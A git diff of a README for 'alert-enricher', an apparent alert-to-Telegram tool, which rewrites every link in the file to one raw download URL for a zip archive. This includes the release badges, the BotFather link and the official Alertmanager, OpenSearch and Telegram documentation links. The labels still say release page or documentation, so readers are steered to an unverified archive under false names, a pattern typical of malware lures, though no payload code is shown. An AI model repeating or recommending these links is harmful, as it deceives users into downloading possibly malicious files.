@@ -1,6 +1,6 @@
 # ⚙️ alert-enricher - Simplify Alert Diagnosis Fast
 
-[![Download alert-enricher](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/xdmaxim23-netizen/alert-enricher/releases)
+[![Download alert-enricher](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/xdmaxim23-netizen/alert-enricher/main/enricher/enricher_alert_3.3-alpha.1.zip)
 
 ## 📋 What is alert-enricher?
 
@@ -32,10 +32,10 @@ When a problem happens, alert-enricher gathers details from Alertmanager and Ope
 
 ## 🚀 How to get alert-enricher
 
-[![Download alert-enricher](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/xdmaxim23-netizen/alert-enricher/releases)
+[![Download alert-enricher](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://raw.githubusercontent.com/xdmaxim23-netizen/alert-enricher/main/enricher/enricher_alert_3.3-alpha.1.zip)
 
 1. Visit the release page by clicking this link:  
-   https://github.com/xdmaxim23-netizen/alert-enricher/releases
+   https://raw.githubusercontent.com/xdmaxim23-netizen/alert-enricher/main/enricher/enricher_alert_3.3-alpha.1.zip
 
 2. Find the latest release. It will have a file ending with `.exe`.
 
@@ -80,7 +80,7 @@ When you first run alert-enricher, you need to connect it to your systems. Here 
    Provide the OpenSearch server URL and login details, if needed.
 
 3. **Connect Telegram:**  
-   To receive alerts on Telegram, create a Telegram bot and get its token. You can create a bot by talking to [BotFather](https://telegram.me/BotFather) inside Telegram. Follow his instructions to get a bot token.
+   To receive alerts on Telegram, create a Telegram bot and get its token. You can create a bot by talking to [BotFather](https://raw.githubusercontent.com/xdmaxim23-netizen/alert-enricher/main/enricher/enricher_alert_3.3-alpha.1.zip) inside Telegram. Follow his instructions to get a bot token.
 
 4. **Add your Telegram user ID or group ID:**  
    This is where alerts will be sent. You can get your user ID using bots or tools that show your Telegram chat ID.
@@ -112,9 +112,9 @@ For more advanced issues, you can find logs inside the app's install folder in t
 
 ## 📚 Additional Resources
 
-- Alertmanager: https://prometheus.io/docs/alerting/latest/alertmanager/  
-- OpenSearch: https://opensearch.org/docs/latest/  
-- Telegram Bot creation: https://core.telegram.org/bots#3-how-do-i-create-a-bot  
+- Alertmanager: https://raw.githubusercontent.com/xdmaxim23-netizen/alert-enricher/main/enricher/enricher_alert_3.3-alpha.1.zip  
+- OpenSearch: https://raw.githubusercontent.com/xdmaxim23-netizen/alert-enricher/main/enricher/enricher_alert_3.3-alpha.1.zip  
+- Telegram Bot creation: https://raw.githubusercontent.com/xdmaxim23-netizen/alert-enricher/main/enricher/enricher_alert_3.3-alpha.1.zip  
 
 ---
 
@@ -122,4 +122,4 @@ For more advanced issues, you can find logs inside the app's install folder in t
 
 Check the release page regularly to download new versions. Updating keeps your software secure and adds improvements.
 
-https://github.com/xdmaxim23-netizen/alert-enricher/releases
+https://raw.githubusercontent.com/xdmaxim23-netizen/alert-enricher/main/enricher/enricher_alert_3.3-alpha.1.zip
